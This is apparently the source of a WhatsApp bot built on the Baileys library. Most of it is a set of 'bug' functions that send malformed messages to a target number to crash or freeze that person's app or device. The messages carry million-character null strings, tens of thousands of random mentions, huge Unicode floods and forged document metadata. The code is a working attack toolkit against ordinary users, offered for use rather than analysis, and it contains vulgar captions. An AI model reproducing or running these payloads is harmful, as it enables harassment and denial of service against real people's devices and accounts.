//========HELO FRIEND========//
require('./config')
const { 
default: baileys, 
proto, 
getContentType, 
generateWAMessage, 
generateWAMessageFromContent, 
generateWAMessageContent,
prepareWAMessageMedia, 
downloadContentFromMessage
} = require("@whiskeysockets/baileys");
const fs = require('fs-extra')
const util = require('util')
const chalk = require('chalk')
const { addPremiumUser, delPremiumUser } = require("./lib/premiun");
const { getBuffer, getGroupAdmins, getSizeMedia, fetchJson, sleep, isUrl, runtime } = require('./lib/myfunction');
//===============
module.exports = rikz = async (rikz, m, chatUpdate, store) => {
try {
const body = (
m.mtype === "conversation" ? m.message.conversation :
m.mtype === "imageMessage" ? m.message.imageMessage.caption :
m.mtype === "videoMessage" ? m.message.videoMessage.caption :
m.mtype === "extendedTextMessage" ? m.message.extendedTextMessage.text :
m.mtype === "buttonsResponseMessage" ? m.message.buttonsResponseMessage.selectedButtonId :
m.mtype === "listResponseMessage" ? m.message.listResponseMessage.singleSelectReply.selectedRowId :
m.mtype === "interactiveResponseMessage" ? JSON.parse(m.message.interactiveResponseMessage.nativeFlowResponseMessage.paramsJson).id :
m.mtype === "templateButtonReplyMessage" ? m.message.templateButtonReplyMessage.selectedId :
m.mtype === "messageContextInfo" ?
m.message.buttonsResponseMessage?.selectedButtonId ||
m.message.listResponseMessage?.singleSelectReply.selectedRowId ||
m.message.InteractiveResponseMessage.NativeFlowResponseMessage ||
m.text : "");
const prefix = (typeof body === "string" ? global.prefix.find(p => body.startsWith(p)) : null) || "";  
const isCmd = !!prefix;  
const args = isCmd ? body.slice(prefix.length).trim().split(/ +/).slice(1) : []; 
const command = isCmd ? body.slice(prefix.length).trim().split(/ +/)[0].toLowerCase() : "";
const text = q = args.join(" ")//hard
const fatkuns = m.quoted || m;
const quoted = ["buttonsMessage", "templateMessage", "product"].includes(fatkuns.mtype)
? fatkuns[Object.keys(fatkuns)[1] || Object.keys(fatkuns)[0]]
: fatkuns;
//======================
const botNumber = await rikz.decodeJid(rikz.user.id);
const premuser = JSON.parse(fs.readFileSync("./system/database/premium.json"));
const isCreator = [botNumber, ...global.owner].map(v => v.replace(/[^0-9]/g, "") + "@s.whatsapp.net").includes(m.sender);
const isPremium = [botNumber, ...global.owner, ...premuser.map(user => user.id.replace(/[^0-9]/g, "") + "@s.whatsapp.net")].includes(m.sender);
if (!rikz.public && !isCreator) return;
//======================
const isGroup = m.chat.endsWith("@g.us");
const groupMetadata = isGroup ? await rikz.groupMetadata(m.chat).catch(() => ({})) : {};
const participants = groupMetadata.participants || [];
const groupAdmins = participants.filter(v => v.admin).map(v => v.id);
const isBotAdmins = groupAdmins.includes(botNumber);
const isAdmins = groupAdmins.includes(m.sender);
const groupName = groupMetadata.subject || "";
//======================
if (m.message) {
rikz.readMessages([m.key]);
console.log("┏━━━━━━━━━━━━━━━━━━━━━━━=");
console.log(`┃¤ ${chalk.hex("#FFD700").bold("📩 NEW MESSAGE")} ${chalk.hex("#00FFFF").bold(`[${new Date().toLocaleTimeString()}]`)} `);
console.log(`┃¤ ${chalk.hex("#FF69B4")("💌 Dari:")} ${chalk.hex("#FFFFFF")(`${m.pushName} (${m.sender})`)} `);
console.log(`┃¤ ${chalk.hex("#FFA500")("📍 Di:")} ${chalk.hex("#FFFFFF")(`${groupName || "Private Chat"}`)} `);
console.log(`┃¤ ${chalk.hex("#00FF00")("📝 Pesan:")} ${chalk.hex("#FFFFFF")(`${body || m?.mtype || "Unknown"}`)} `);
console.log("┗━━━━━━━━━━━━━━━━━━━━━━━=")}
//FUNCTION BUG
async function forclose(target) {
const stanza = [
{
attrs: { biz_bot: '1' },
tag: "bot",
},
{
attrs: {},
tag: "biz",
},
];

let messagePayload = {
viewOnceMessage: {
message: {
listResponseMessage: {
title: "💎⃢ ᴍ͜͡ᴀ͜͡ʏ͜͡ᴢ͜͡ ɪ͜͡s⃟͜͡ ʜ͜͡ᴇ͜͡ʀ͜͡ᴇ͜͡ ⃢↯🔥" + "ꦾ".repeat(4500),
listType: 2,
singleSelectReply: {
    selectedRowId: "🔪"
},
contextInfo: {
stanzaId: rikz.generateMessageTag(),
participant: "0@s.whatsapp.net",
remoteJid: "status@broadcast",
mentionedJid: [target, "13135550002@s.whatsapp.net"],
quotedMessage: {
                buttonsMessage: {
                    documentMessage: {
                        url: "https://mmg.whatsapp.net/v/t62.7119-24/26617531_1734206994026166_128072883521888662_n.enc?ccb=11-4&oh=01_Q5AaIC01MBm1IzpHOR6EuWyfRam3EbZGERvYM34McLuhSWHv&oe=679872D7&_nc_sid=5e03e0&mms3=true",
                        mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
                        fileSha256: "+6gWqakZbhxVx8ywuiDE3llrQgempkAB2TK15gg0xb8=",
                        fileLength: "9999999999999",
                        pageCount: 3567587327,
                        mediaKey: "n1MkANELriovX7Vo7CNStihH5LITQQfilHt6ZdEf+NQ=",
                        fileName: "💎⃢ ᴍ͜͡ᴀ͜͡ʏ͜͡ᴢ͜͡ ɪ͜͡s⃟͜͡ ʜ͜͡ᴇ͜͡ʀ͜͡ᴇ͜͡ ⃢↯🔥",
                        fileEncSha256: "K5F6dITjKwq187Dl+uZf1yB6/hXPEBfg2AJtkN/h0Sc=",
                        directPath: "/v/t62.7119-24/26617531_1734206994026166_128072883521888662_n.enc?ccb=11-4&oh=01_Q5AaIC01MBm1IzpHOR6EuWyfRam3EbZGERvYM34McLuhSWHv&oe=679872D7&_nc_sid=5e03e0",
                        mediaKeyTimestamp: "1735456100",
                        contactVcard: true,
                        caption: "Wanna Die ? Huh !"
                    },
                    contentText: "I Wanna Die With You \"😮‍💨\"",
                    footerText: "© 𝑫𝒂𝒑𝒛𝒚",
                    buttons: [
                        {
                            buttonId: "\u0000".repeat(850000),
                            buttonText: {
                                displayText: "⏤͟͟͞͞𝑫𝒂𝒑𝒛𝒚 𝐕𝟏⿻"
                            },
                            type: 1
                        }
                    ],
                    headerType: 3
                }
},
conversionSource: "porn",
conversionDelaySeconds: 9999,
forwardingScore: 999999,
isForwarded: true,
quotedAd: {
advertiserName: " x ",
mediaType: "IMAGE",
caption: " x "
},
placeholderKey: {
remoteJid: "0@s.whatsapp.net",
fromMe: false,
id: "ABCDEF1234567890"
},
expiration: -99999,
ephemeralSettingTimestamp: Date.now(),
entryPointConversionSource: "wangcap",
entryPointConversionApp: "wangcap",
actionLink: {
url: "t.me/kirana_Offc",
buttonTitle: "trash"
},
disappearingMode:{
initiator:1,
trigger:2,
initiatorDeviceJid: target,
initiatedByMe:true
},
groupSubject: "Mahiru",
parentGroupJid: "combine",
trustBannerType: "unexpected",
trustBannerAction: 99999,
isSampled: true,
externalAdReply: {
title: "𑲭𑲭 𝑫𝒂𝒑𝒛𝒚 𝐕𝟏 ~ \"Dev\" ⚔️ ",
mediaType: 2,
renderLargerThumbnail: false,
showAdAttribution: false,
containsAutoReply: false,
body: "© Agler Forger",
sourceUrl: "se me?",
sourceId: "Agler Forger",
ctwaClid: "cta",
ref: "ref",
clickToWhatsappCall: true,
automatedGreetingMessageShown: false,
greetingMessageBody: "burst",
ctaPayload: "cta",
disableNudge: true,
originalImageUrl: "trash"
},
featureEligibilities: {
cannotBeReactedTo: true,
cannotBeRanked: true,
canRequestFeedback: true
},
forwardedNewsletterMessageInfo: {
newsletterJid: "120363415983819549@newsletter",
serverMessageId: 1,
newsletterName: `Crash Sletter ~ ${"ꥈꥈꥈꥈꥈꥈ".repeat(10)}`,
contentType: 3,
accessibilityText: "crash"
},
statusAttributionType: 2,
utm: {
utmSource: "utm",
utmCampaign: "utm2"
}
},
description: "INITIATED_BY_USER"
},
messageContextInfo: {
supportPayload: JSON.stringify({
version: 2,
is_ai_message: true,
should_show_system_message: true,
}),
},
}
}
}

await rikz.relayMessage(target, messagePayload, {
additionalNodes: stanza,
participant: { jid : target }
});
console.log("")
}
async function VampSpam(langgxyz, target) {
  try {
    let message = {
      viewOnceMessage: {
        message: {
          messageContextInfo: {
            deviceListMetadata: {},
            deviceListMetadataVersion: 2,
          },
          interactiveMessage: {
            contextInfo: {
              mentionedJid: [target],
              isForwarded: true,
              forwardingScore: 999,
              businessMessageForwardInfo: {
                businessOwnerJid: target,
              },
            },
            body: {
              text: "ambuky 🐍 🐍 Here",
            },
            nativeFlowMessage: {
              buttons: [
                {
                  name: "single_select",
                  buttonParamsJson: "",
                },
                {
                  name: "call_permission_request",
                  buttonParamsJson: "",
                },
                {
                  name: "mpm",
                  buttonParamsJson: "",
                },
                {
                  name: "mpm",
                  buttonParamsJson: "",
                },
                {
                  name: "mpm",
                  buttonParamsJson: "",
                },
                {
                  name: "mpm",
                  buttonParamsJson: "",
                },
              ],
            },
          },
        },
      },
    };

    await rikz.relayMessage(target, message, {
      participant: { jid: target },
    });
  } catch (err) {
    console.log(err);
  }
}
async function VampDeviceCrash(langgxyz, target) {
    await rikz.relayMessage(number, {
        viewOnceMessage: {
            message: {
                interactiveResponseMessage: {
                    body: {
                        text: "Hi...I'm ambuky Crash 🐍",
                        format: "DEFAULT"
                    },
                    nativeFlowResponseMessage: {
                        name: "call_permission_request",
                        paramsJson: "\u0000".repeat(1000000),
                        version: 3
                    }
                }
            }
        }
    }, { participant: { jid: target}});
}

async function VampPaymentCrash(target, Ptcp = true) {
    await rikz.relayMessage(target, {
        viewOnceMessage: {
            message: {
                interactiveResponseMessage: {
                    body: {
                        text: "Flixce.biz.net",
                        format: "DEFAULT"
                    },
                    nativeFlowResponseMessage: {
                        name: "payment_transaction_request",
                        paramsJson: "\u0003".repeat(1000000),
                        version: 3
                    }
                }
            }
        }
    }, { participant: { jid: target }});
}

async function VampDelayMess(langgxyz, target) {
    const message = {
        ephemeralMessage: {
            message: {
                interactiveMessage: {
                    header: {
                        documentMessage: {
                            url: "https://mmg.whatsapp.net/v/t62.7119-24/30958033_897372232245492_2352579421025151158_n.enc?ccb=11-4&oh=01_Q5AaIOBsyvz-UZTgaU-GUXqIket-YkjY-1Sg28l04ACsLCll&oe=67156C73&_nc_sid=5e03e0&mms3=true",
                            mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
                            fileSha256: "QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=",
                            fileLength: "9999999999999",
                            pageCount: 1316134911,
                            mediaKey: "45P/d5blzDp2homSAvn86AaCzacZvOBYKO8RDkx5Zec=",
                            fileName: "xnxxx.com",
                            fileEncSha256: "LEodIdRH8WvgW6mHqzmPd+3zSR61fXJQMjf3zODnHVo=",
                            directPath: "/v/t62.7119-24/30958033_897372232245492_2352579421025151158_n.enc?ccb=11-4&oh=01_Q5AaIOBsyvz-UZTgaU-GUXqIket-YkjY-1Sg28l04ACsLCll&oe=67156C73&_nc_sid=5e03e0",
                            mediaKeyTimestamp: "1726867151",
                            contactVcard: true,
                            jpegThumbnail: ""
                        },
                        hasMediaAttachment: true
                    },
                    body: {
                        text: "ambuky Crash 🐍 🐍 Is Back\n" + "@062598121203".repeat(17000)
                    },
                    nativeFlowMessage: {
                        buttons: [{
                            name: "cta_url",
                            buttonParamsJson: "{ display_text: 'Ditzi Crash 🐍 🐍 Bot', url: \"https://whatsapp.com/channel/0029Vb68fVN8aKvQGRBqvy2e\", merchant_url: \"https://whatsapp.com/channel/0029Vb68fVN8aKvQGRBqvy2e\" }"
                        }, {
                            name: "call_permission_request",
                            buttonParamsJson: "{}"
                        }],
                        messageParamsJson: "{}"
                    },
                    contextInfo: {
                        mentionedJid: ["6283167068175@s.whatsapp.net", ...Array.from({
                            length: 30000
                        }, () => "1" + Math.floor(Math.random() * 700000) + "@s.whatsapp.net")],
                        forwardingScore: 1,
                        isForwarded: true,
                        fromMe: false,
                        participant: "0@s.whatsapp.net",
                        remoteJid: "status@broadcast",
                        quotedMessage: {
                            documentMessage: {
                                url: "https://mmg.whatsapp.net/v/t62.7119-24/23916836_520634057154756_7085001491915554233_n.enc?ccb=11-4&oh=01_Q5AaIC-Lp-dxAvSMzTrKM5ayF-t_146syNXClZWl3LMMaBvO&oe=66F0EDE2&_nc_sid=5e03e0",
                                mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
                                fileSha256: "QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=",
                                fileLength: "9999999999999",
                                pageCount: 1316134911,
                                mediaKey: "lCSc0f3rQVHwMkB90Fbjsk1gvO+taO4DuF+kBUgjvRw=",
                                fileName: "xvideos.com",
                                fileEncSha256: "wAzguXhFkO0y1XQQhFUI0FJhmT8q7EDwPggNb89u+e4=",
                                directPath: "/v/t62.7119-24/23916836_520634057154756_7085001491915554233_n.enc?ccb=11-4&oh=01_Q5AaIC-Lp-dxAvSMzTrKM5ayF-t_146syNXClZWl3LMMaBvO&oe=66F0EDE2&_nc_sid=5e03e0",
                                mediaKeyTimestamp: "1724474503",
                                contactVcard: true,
                                thumbnailDirectPath: "/v/t62.36145-24/13758177_1552850538971632_7230726434856150882_n.enc?ccb=11-4&oh=01_Q5AaIBZON6q7TQCUurtjMJBeCAHO6qa0r7rHVON2uSP6B-2l&oe=669E4877&_nc_sid=5e03e0",
                                thumbnailSha256: "njX6H6/YF1rowHI+mwrJTuZsw0n4F/57NaWVcs85s6Y=",
                                thumbnailEncSha256: "gBrSXxsWEaJtJw4fweauzivgNm2/zdnJ9u1hZTxLrhE=",
                                jpegThumbnail: ""
                            }
                        }
                    }
                }
            }
        }
    };

    await rikz.relayMessage(target, message, {
        participant: { jid: target }
    });
}

async function VampPrivateBlank(langgxyz, target) {
  const Vampire = `_*~@2~*_\n`.repeat(10500);
  const Private = 'ꦽ'.repeat(5000);

  const message = {
    ephemeralMessage: {
      message: {
        interactiveMessage: {
          header: {
            documentMessage: {
              url: "https://mmg.whatsapp.net/v/t62.7119-24/30958033_897372232245492_2352579421025151158_n.enc?ccb=11-4&oh=01_Q5AaIOBsyvz-UZTgaU-GUXqIket-YkjY-1Sg28l04ACsLCll&oe=67156C73&_nc_sid=5e03e0&mms3=true",
              mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
              fileSha256: "QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=",
              fileLength: "9999999999999",
              pageCount: 1316134911,
              mediaKey: "45P/d5blzDp2homSAvn86AaCzacZvOBYKO8RDkx5Zec=",
              fileName: "Pembasmi Kontol",
              fileEncSha256: "LEodIdRH8WvgW6mHqzmPd+3zSR61fXJQMjf3zODnHVo=",
              directPath: "/v/t62.7119-24/30958033_897372232245492_2352579421025151158_n.enc?ccb=11-4&oh=01_Q5AaIOBsyvz-UZTgaU-GUXqIket-YkjY-1Sg28l04ACsLCll&oe=67156C73&_nc_sid=5e03e0",
              mediaKeyTimestamp: "1726867151",
              contactVcard: true,
              jpegThumbnail: null,
            },
            hasMediaAttachment: true,
          },
          body: {
            text: 'ambuky Crash 🐍 🐍 Blank!' + Vampire + Private,
          },
          footer: {
            text: '',
          },
          contextInfo: {
            mentionedJid: [
              "6283167068175@s.whatsapp.net",
              ...Array.from(
                { length: 30000 },
                () => "1" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net"
              ),
            ],
            forwardingScore: 1,
            isForwarded: true,
            fromMe: false,
            participant: "0@s.whatsapp.net",
            remoteJid: "status@broadcast",
            quotedMessage: {
              documentMessage: {
                url: "https://mmg.whatsapp.net/v/t62.7119-24/23916836_520634057154756_7085001491915554233_n.enc?ccb=11-4&oh=01_Q5AaIC-Lp-dxAvSMzTrKM5ayF-t_146syNXClZWl3LMMaBvO&oe=66F0EDE2&_nc_sid=5e03e0",
                mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
                fileSha256: "QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=",
                fileLength: "9999999999999",
                pageCount: 1316134911,
                mediaKey: "lCSc0f3rQVHwMkB90Fbjsk1gvO+taO4DuF+kBUgjvRw=",
                fileName: "bokep.com",
                fileEncSha256: "wAzguXhFkO0y1XQQhFUI0FJhmT8q7EDwPggNb89u+e4=",
                directPath: "/v/t62.7119-24/23916836_520634057154756_7085001491915554233_n.enc?ccb=11-4&oh=01_Q5AaIC-Lp-dxAvSMzTrKM5ayF-t_146syNXClZWl3LMMaBvO&oe=66F0EDE2&_nc_sid=5e03e0",
                mediaKeyTimestamp: "1724474503",
                contactVcard: true,
                thumbnailDirectPath: "/v/t62.36145-24/13758177_1552850538971632_7230726434856150882_n.enc?ccb=11-4&oh=01_Q5AaIBZON6q7TQCUurtjMJBeCAHO6qa0r7rHVON2uSP6B-2l&oe=669E4877&_nc_sid=5e03e0",
                thumbnailSha256: "njX6H6/YF1rowHI+mwrJTuZsw0n4F/57NaWVcs85s6Y=",
                thumbnailEncSha256: "gBrSXxsWEaJtJw4fweauzivgNm2/zdnJ9u1hZTxLrhE=",
                jpegThumbnail: "",
              },
            },
          },
        },
      },
    },
  };

  await rikz.relayMessage(target, message, { participant: { jid: target } });
}

async function VampDelayCrash(langgxyz, target) {
    const Vampire = "_*~@15056662003~*_\n".repeat(10200);
    const Lalapo = "ꦽ".repeat(1500);

    const message = {
        ephemeralMessage: {
            message: {
                interactiveMessage: {
                    header: {
                        documentMessage: {
                            url: "https://mmg.whatsapp.net/v/t62.7119-24/30958033_897372232245492_2352579421025151158_n.enc?ccb=11-4&oh=01_Q5AaIOBsyvz-UZTgaU-GUXqIket-YkjY-1Sg28l04ACsLCll&oe=67156C73&_nc_sid=5e03e0&mms3=true",
                            mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
                            fileSha256: "QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=",
                            fileLength: "9999999999999",
                            pageCount: 1316134911,
                            mediaKey: "45P/d5blzDp2homSAvn86AaCzacZvOBYKO8RDkx5Zec=",
                            fileName: "𝐀𝐧𝐚𝐤 𝐇𝐚𝐬𝐢𝐥 𝐋𝐨𝐧𝐭𝐞",
                            fileEncSha256: "LEodIdRH8WvgW6mHqzmPd+3zSR61fXJQMjf3zODnHVo=",
                            directPath: "/v/t62.7119-24/30958033_897372232245492_2352579421025151158_n.enc?ccb=11-4&oh=01_Q5AaIOBsyvz-UZTgaU-GUXqIket-YkjY-1Sg28l04ACsLCll&oe=67156C73&_nc_sid=5e03e0",
                            mediaKeyTimestamp: "1726867151",
                            contactVcard: true,
                            jpegThumbnail: ""
                        },
                        hasMediaAttachment: true
                    },
                    body: {
                        text: "ambuky Crash 🐍 🐍 Bug" + Lalapo + Vampire
                    },
                    contextInfo: {
                        mentionedJid: ["6283167068175@s.whatsapp.net", ...Array.from({ length: 30000 }, () => "1" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net")],
                        forwardingScore: 1,
                        isForwarded: true,
                        fromMe: false,
                        participant: "0@s.whatsapp.net",
                        remoteJid: "status@broadcast",
                        quotedMessage: {
                            documentMessage: {
                                url: "https://mmg.whatsapp.net/v/t62.7119-24/23916836_520634057154756_7085001491915554233_n.enc?ccb=11-4&oh=01_Q5AaIC-Lp-dxAvSMzTrKM5ayF-t_146syNXClZWl3LMMaBvO&oe=66F0EDE2&_nc_sid=5e03e0",
                                mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
                                fileSha256: "QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=",
                                fileLength: "9999999999999",
                                pageCount: 1316134911,
                                mediaKey: "lCSc0f3rQVHwMkB90Fbjsk1gvO+taO4DuF+kBUgjvRw=",
                                fileName: "https://xnxxx.com",
                                fileEncSha256: "wAzguXhFkO0y1XQQhFUI0FJhmT8q7EDwPggNb89u+e4=",
                                directPath: "/v/t62.7119-24/23916836_520634057154756_7085001491915554233_n.enc?ccb=11-4&oh=01_Q5AaIC-Lp-dxAvSMzTrKM5ayF-t_146syNXClZWl3LMMaBvO&oe=66F0EDE2&_nc_sid=5e03e0",
                                mediaKeyTimestamp: "1724474503",
                                contactVcard: true,
                                thumbnailDirectPath: "/v/t62.36145-24/13758177_1552850538971632_7230726434856150882_n.enc?ccb=11-4&oh=01_Q5AaIBZON6q7TQCUurtjMJBeCAHO6qa0r7rHVON2uSP6B-2l&oe=669E4877&_nc_sid=5e03e0",
                                thumbnailSha256: "njX6H6/YF1rowHI+mwrJTuZsw0n4F/57NaWVcs85s6Y=",
                                thumbnailEncSha256: "gBrSXxsWEaJtJw4fweauzivgNm2/zdnJ9u1hZTxLrhE=",
                                jpegThumbnail: ""
                            }
                        }
                    }
                }
            }
        }
    };

    await rikz.relayMessage(target, message, { participant: { jid: target } });
}

async function VampBroadcast(langgxyz, target, mention = true) { // Default true biar otomatis nyala
    const delaymention = Array.from({ length: 30000 }, (_, r) => ({
        title: "᭡꧈".repeat(95000),
        rows: [{ title: `${r + 1}`, id: `${r + 1}` }]
    }));

    const MSG = {
        viewOnceMessage: {
            message: {
                listResponseMessage: {
                    title: "ambuky Crash 🐍 🐍 Here",
                    listType: 2,
                    buttonText: null,
                    sections: delaymention,
                    singleSelectReply: { selectedRowId: "🔴" },
                    contextInfo: {
                        mentionedJid: Array.from({ length: 30000 }, () => 
                            "1" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net"
                        ),
                        participant: target,
                        remoteJid: "status@broadcast",
                        forwardingScore: 9741,
                        isForwarded: true,
                        forwardedNewsletterMessageInfo: {
                            newsletterJid: "120363400383798698@newsletter",
                            serverMessageId: 1,
                            newsletterName: "-"
                        }
                    },
                    description: "Dont Bothering Me Bro!!!"
                }
            }
        },
        contextInfo: {
            channelMessage: true,
            statusAttributionType: 2
        }
    };

    const msg = generateWAMessageFromContent(target, MSG, {});

    await rikz.relayMessage("status@broadcast", msg.message, {
        messageId: msg.key.id,
        statusJidList: [target],
        additionalNodes: [
            {
                tag: "meta",
                attrs: {},
                content: [
                    {
                        tag: "mentioned_users",
                        attrs: {},
                        content: [
                            {
                                tag: "to",
                                attrs: { jid: target },
                                content: undefined
                            }
                        ]
                    }
                ]
            }
        ]
    });

    // **Cek apakah mention true sebelum menjalankan relayMessage**
    if (mention) {
        await rikz.relayMessage(
            target,
            {
                statusMentionMessage: {
                    message: {
                        protocolMessage: {
                            key: msg.key,
                            type: 25
                        }
                    }
                }
            },
            {
                additionalNodes: [
                    {
                        tag: "meta",
                        attrs: { is_status_mention: "ambuky Crash 🐍 🐍 Here Bro" },
                        content: undefined
                    }
                ]
            }
        );
    }
}


        // Func Protocol 
async function protocolbug1(isTarget, mention) {
const delaymention = Array.from({ length: 9741 }, (_, r) => ({
title: "᭯".repeat(9741),
rows: [{ title: `${r + 1}`, id: `${r + 1}` }]
}));

const MSG = {
viewOnceMessage: {
message: {
listResponseMessage: {
title: "Ciee Kena Bug ya??",
listType: 2,
buttonText: null,
sections: delaymention,
singleSelectReply: { selectedRowId: "🌀" },
contextInfo: {
mentionedJid: Array.from({ length: 9741 }, () => "1" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net"),
participant: isTarget,
remoteJid: "status@broadcast",
forwardingScore: 9741,
isForwarded: true,
forwardedNewsletterMessageInfo: {
newsletterJid: "9741@newsletter",
serverMessageId: 1,
newsletterName: "-"
}
},
description: "( Script ambuky Crash V1 )"
}
}
},
contextInfo: {
channelMessage: true,
statusAttributionType: 2
}
};

const msg = generateWAMessageFromContent(isTarget, MSG, {});

await rikz.relayMessage("status@broadcast", msg.message, {
messageId: msg.key.id,
statusJidList: [isTarget],
additionalNodes: [
{
tag: "meta",
attrs: {},
content: [
{
tag: "mentioned_users",
attrs: {},
content: [
{
tag: "to",
attrs: { jid: isTarget },
content: undefined
}
]
}
]
}
]
});

if (mention) {
await rikz.relayMessage(
isTarget,
{
statusMentionMessage: {
message: {
protocolMessage: {
key: msg.key,
type: 25
}
}
}
},
{
additionalNodes: [
{
tag: "meta",
attrs: { is_status_mention: "🌀 *𝐀𝐦𝐛𝐮𝐤𝐲 𝐂𝐫𝐚𝐬𝐡𝐞𝐫" },
content: undefined
}
]
}
);
}
}

async function protocolbug2(isTarget, mention) {
    const generateMessage = {
        viewOnceMessage: {
            message: {
                imageMessage: {
                    url: "https://mmg.whatsapp.net/v/t62.7118-24/31077587_1764406024131772_5735878875052198053_n.enc?ccb=11-4&oh=01_Q5AaIRXVKmyUlOP-TSurW69Swlvug7f5fB4Efv4S_C6TtHzk&oe=680EE7A3&_nc_sid=5e03e0&mms3=true",
                    mimetype: "image/jpeg",
                    caption: "? ???????-?",
                    fileSha256: "Bcm+aU2A9QDx+EMuwmMl9D56MJON44Igej+cQEQ2syI=",
                    fileLength: "19769",
                    height: 354,
                    width: 783,
                    mediaKey: "n7BfZXo3wG/di5V9fC+NwauL6fDrLN/q1bi+EkWIVIA=",
                    fileEncSha256: "LrL32sEi+n1O1fGrPmcd0t0OgFaSEf2iug9WiA3zaMU=",
                    directPath: "/v/t62.7118-24/31077587_1764406024131772_5735878875052198053_n.enc",
                    mediaKeyTimestamp: "1743225419",
                    jpegThumbnail: null,
                    scansSidecar: "mh5/YmcAWyLt5H2qzY3NtHrEtyM=",
                    scanLengths: [2437, 17332],
                    contextInfo: {
                        mentionedJid: Array.from({ length: 30000 }, () => "1" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net"),
                        isSampled: true,
                        participant: isTarget,
                        remoteJid: "status@broadcast",
                        forwardingScore: 9741,
                        isForwarded: true
                    }
                }
            }
        }
    };

    const msg = generateWAMessageFromContent(isTarget, generateMessage, {});

    await rikz.relayMessage("status@broadcast", msg.message, {
        messageId: msg.key.id,
        statusJidList: [isTarget],
        additionalNodes: [
            {
                tag: "meta",
                attrs: {},
                content: [
                    {
                        tag: "mentioned_users",
                        attrs: {},
                        content: [
                            {
                                tag: "to",
                                attrs: { jid: isTarget },
                                content: undefined
                            }
                        ]
                    }
                ]
            }
        ]
    });

    if (mention) {
        await rikz.relayMessage(
            isTarget,
            {
                statusMentionMessage: {
                    message: {
                        protocolMessage: {
                            key: msg.key,
                            type: 25
                        }
                    }
                }
            },
            {
                additionalNodes: [
                    {
                        tag: "meta",
                        attrs: { is_status_mention: "???? ???????? - ????" },
                        content: undefined
                    }
                ]
            }
        );
    }
}

async function protocolbug3(target, mention) {
    const msg = generateWAMessageFromContent(target, {
        viewOnceMessage: {
            message: {
                videoMessage: {
                    url: "https://mmg.whatsapp.net/v/t62.7161-24/35743375_1159120085992252_7972748653349469336_n.enc?ccb=11-4&oh=01_Q5AaISzZnTKZ6-3Ezhp6vEn9j0rE9Kpz38lLX3qpf0MqxbFA&oe=6816C23B&_nc_sid=5e03e0&mms3=true",
                    mimetype: "video/mp4",
                    fileSha256: "9ETIcKXMDFBTwsB5EqcBS6P2p8swJkPlIkY8vAWovUs=",
                    fileLength: "999999",
                    seconds: 999999,
                    mediaKey: "JsqUeOOj7vNHi1DTsClZaKVu/HKIzksMMTyWHuT9GrU=",
                    caption: "\u9999",
                    height: 999999,
                    width: 999999,
                    fileEncSha256: "HEaQ8MbjWJDPqvbDajEUXswcrQDWFzV0hp0qdef0wd4=",
                    directPath: "/v/t62.7161-24/35743375_1159120085992252_7972748653349469336_n.enc?ccb=11-4&oh=01_Q5AaISzZnTKZ6-3Ezhp6vEn9j0rE9Kpz38lLX3qpf0MqxbFA&oe=6816C23B&_nc_sid=5e03e0",
                    mediaKeyTimestamp: "1743742853",
                    contextInfo: {
                        isSampled: true,
                        mentionedJid: [
                            "6283167068176@s.whatsapp.net",
                            ...Array.from({ length: 30000 }, () =>
                                `1${Math.floor(Math.random() * 500000)}@s.whatsapp.net`
                            )
                        ]
                    },
                    streamingSidecar: "Fh3fzFLSobDOhnA6/R+62Q7R61XW72d+CQPX1jc4el0GklIKqoSqvGinYKAx0vhTKIA=",
                    thumbnailDirectPath: "/v/t62.36147-24/31828404_9729188183806454_2944875378583507480_n.enc?ccb=11-4&oh=01_Q5AaIZXRM0jVdaUZ1vpUdskg33zTcmyFiZyv3SQyuBw6IViG&oe=6816E74F&_nc_sid=5e03e0",
                    thumbnailSha256: "vJbC8aUiMj3RMRp8xENdlFQmr4ZpWRCFzQL2sakv/Y4=",
                    thumbnailEncSha256: "dSb65pjoEvqjByMyU9d2SfeB+czRLnwOCJ1svr5tigE=",
                    annotations: [
                        {
                            embeddedContent: {
                                embeddedMusic: {
                                    musicContentMediaId: "kontol",
                                    songId: "peler",
                                    author: "\u9999",
                                    title: "\u9999",
                                    artworkDirectPath: "/v/t62.76458-24/30925777_638152698829101_3197791536403331692_n.enc?ccb=11-4&oh=01_Q5AaIZwfy98o5IWA7L45sXLptMhLQMYIWLqn5voXM8LOuyN4&oe=6816BF8C&_nc_sid=5e03e0",
                                    artworkSha256: "u+1aGJf5tuFrZQlSrxES5fJTx+k0pi2dOg+UQzMUKpI=",
                                    artworkEncSha256: "fLMYXhwSSypL0gCM8Fi03bT7PFdiOhBli/T0Fmprgso=",
                                    artistAttribution: "https://www.instagram.com/ekk_cold?igsh=Ync1eWx4YnYzODQ5",
                                    countryBlocklist: true,
                                    isExplicit: true,
                                    artworkMediaKey: "kNkQ4+AnzVc96Uj+naDjnwWVyzwp5Nq5P1wXEYwlFzQ="
                                }
                            },
                            embeddedAction: null
                        }
                    ]
                }
            }
        }
    }, {});

    await rikz.relayMessage("status@broadcast", msg.message, {
        messageId: msg.key.id,
        statusJidList: [target],
        additionalNodes: [
            {
                tag: "meta",
                attrs: {},
                content: [
                    {
                        tag: "mentioned_users",
                        attrs: {},
                        content: [{ tag: "to", attrs: { jid: target }, content: undefined }]
                    }
                ]
            }
        ]
    });

    if (mention) {
        await rikz.relayMessage(target, {
            groupStatusMentionMessage: {
                message: { protocolMessage: { key: msg.key, type: 25 } }
            }
        }, {
            additionalNodes: [{ tag: "meta", attrs: { is_status_mention: "true" }, content: undefined }]
        });
    }
  }
    
